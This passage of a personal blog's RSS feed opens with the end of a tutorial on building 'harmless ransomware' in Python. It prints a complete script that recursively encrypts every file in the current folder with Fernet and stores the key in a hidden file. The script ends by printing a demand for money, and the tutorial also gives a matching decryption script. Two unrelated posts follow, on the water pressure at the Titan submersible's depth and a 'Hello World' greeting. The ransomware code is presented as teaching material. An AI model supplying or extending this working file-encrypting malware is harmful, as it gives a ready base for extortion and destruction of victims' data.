</span></span></code></pre></div><p>So the complete encryption program (<code>bill-cipher.py</code>) will look something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/local/bin/python3 </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#e06c75">files</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">generate_key</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">key</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_encrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">encrypt</span>(<span style="color:#e06c75">content</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_encrypted</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;Files are encrypted! Send me moneyyyyyyyyyyyyyyy&#34;</span>)
</span></span></code></pre></div><p>Now, if we run <code>bill-cipher.py</code>, we can see that all the files that this program can get its hand on becomes a jumble of illegible letters.</p>
<p><img alt="file1-encrypted" src="/img/harmless-ransomware/file1-encrypted.png"></p>
<p>Even the image files become unreadable.</p>
<p><img alt="pic-encrypted" src="/img/harmless-ransomware/pic-encrypted.png"></p>
<p>So now that we have the files encrypted, we need some way to decrypt it.</p>
<hr>
<h1 id="the-decryption">The decryption</h1>
<p>In order to decrypt it, we need to do the exact same thing as when we encrypted the files but a little different.</p>
<p>Instead of creating a new key, we read the key from <code>.a_deal</code> because this is the key that was used to encrypt the files.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span></code></pre></div><p>When we read each of the files, we need to use the key that we read from <code>.a_deal</code> to decrypt it instead of encrypting it like we did before.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_decrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">decrypt</span>(<span style="color:#e06c75">content</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_decrypted</span>)
</span></span></code></pre></div><p>So the complete decryption program (<code>bill-decipher.py</code>) will look a bit something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/local/bin/python3 </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#e06c75">files</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_decrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">decrypt</span>(<span style="color:#e06c75">content</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_decrypted</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;Files decrypted!&#34;</span>)
</span></span></code></pre></div><p>And after running this, we can read the content of our files.</p>
<p><img alt="file1-decrypted" src="/img/harmless-ransomware/file1-decrypted.png"></p>
<p>We can also see our image files.</p>
<p><img alt="pic-decrypted" src="/img/harmless-ransomware/pic-decrypted.png"></p>
<hr>
<h1 id="the-conclusion">The conclusion</h1>
<p>So there we have it, an encryption and decryption program that makes up a ransomware. Of course, this is a very simple and rather harmless ransomware. In fact, if someone is a bit tech savvy, they won&rsquo;t have much trouble decrypting the files.</p>
<p>But what&rsquo;s at this ransomware&rsquo;s core is also what&rsquo;s at any other ransomware&rsquo;s core, the ability to find and encrypt all the files on the computer and the ability to decrypt them later on.</p>
<p>This is the basic principle that every ransomware operates on.</p>
<blockquote>
<p>You can find the source code for this project <a href="https://github.com/namberino/simple-ransomware">here</a>.</p>
</blockquote>
]]></content>
        </item>
        
        <item>
            <title>The pressure of OceanGate&#39;s Titan</title>
            <link>https://namberino.github.io/posts/2024/02/the-pressure-of-oceangates-titan/</link>
            <pubDate>Mon, 19 Feb 2024 12:27:06 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/02/the-pressure-of-oceangates-titan/</guid>
            <description>I was bored so I went down the rabbit hole of engineering disasters. One disaster that caught my eyes was the OceanGate&amp;rsquo;s Titan incident. It caught my eyes because I was curious about how much pressure was applied onto the submarine at that depth, so I grab my calculator and got to work.
The most dangerous thing about deep ocean is probably the hydrostatic pressure. This pressure is proportional to the depth measured from the surface of the water body.</description>
            <content type="html"><![CDATA[<p>I was bored so I went down the rabbit hole of engineering disasters. One disaster that caught my eyes was the <em>OceanGate&rsquo;s Titan incident</em>. It caught my eyes because I was curious about how much pressure was applied onto the submarine at that depth, so I grab my calculator and got to work.</p>
<p>The most dangerous thing about deep ocean is probably the hydrostatic pressure. This pressure is proportional to the depth measured from the surface of the water body. The weight of the body of fluid gradually increases.</p>
<p>This hydrostatic pressure is calculated with the following formula (assuming the pressure is measured over a <em>$1m^2$</em> liquid block):</p>
<p>$$
P = \rho g h
$$</p>
<p>Where:</p>
<p><em>$P$</em>: Pressure of the liquid ($N/m^2$)</p>
<p><em>$\rho$</em>: Density of the liquid ($kg/m^3$)</p>
<p><em>$g$</em>: Acceleration due to gravity ($9.8 m/s^2$)</p>
<p><em>$h$</em>: The height of the liquid column</p>

    <img src="/img/oceangate/pressure.png"  alt="pressure diagram"  class="center"  style="padding: 10px"  />


<p>First, we can calculate the pressure that a normal human may experience on the surface and then multiply it with the depth of the OceanGate&rsquo;s Titan.</p>
<p>We already know some variable:</p>
<ul>
<li>The pressure ($P$) that we usually experience is $1atm$ or $100,000 N/m^2$</li>
<li>The density of water is $1,000 kg/m^3$</li>
<li>$g$ is $9.8 m/s^2$ but we&rsquo;ll round it up to $10 m/s^2$</li>
</ul>
<p>So we can calculate that:</p>
<p>$$
\frac{100,000 N/m^2}{1,000 kg/m^3 \cdot 10 m/s^2} = 10m
$$</p>
<p>So the pressure increases by $1atm$ for every $10m$ of depth we go down. And since OceanGate&rsquo;s Titan was around $4,000m$ deep when it imploded, we can calculate that:</p>
<p>$$
\frac{4,000m}{10m} = 400atm
$$</p>
<p>So the OceanGate&rsquo;s Titan was experiencing around $400atm$ of pressure when it imploded. Over <strong>400</strong> times what we normally experience.</p>
<p>It&rsquo;s a bit hard to put $400atm$ into perspective. So for reference, here&rsquo;s a video of a can exploding under only $1atm$ of pressure:</p>


    
    <div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="allowfullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/atsgIvOUFhA?autoplay=0&controls=1&end=0&loop=0&mute=0&start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"
      ></iframe>
    </div>

]]></content>
        </item>
        
        <item>
            <title>Hello World!</title>
            <link>https://namberino.github.io/posts/2024/01/hello-world/</link>
            <pubDate>Sat, 27 Jan 2024 16:11:34 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/01/hello-world/</guid>
            <description>This is the first post on this website.
The next posts will be about various different topics, such as science, engineering, maybe even some random topics that crosses my mind that I find interesting
For now, here&amp;rsquo;s a picture of a cute dog:</description>
            <content type="html"><![CDATA[<p>This is the first post on this website.</p>
<p>The next posts will be about various different topics, such as science, engineering, maybe even some random topics that crosses my mind that I find interesting</p>
<p>For now, here&rsquo;s a picture of a cute dog:</p>
<p><img alt="Cute dogo" src="/img/hello-world/dogo1.jpg"></p>
]]></content>
        </item>
        
    </channel>
</rss>
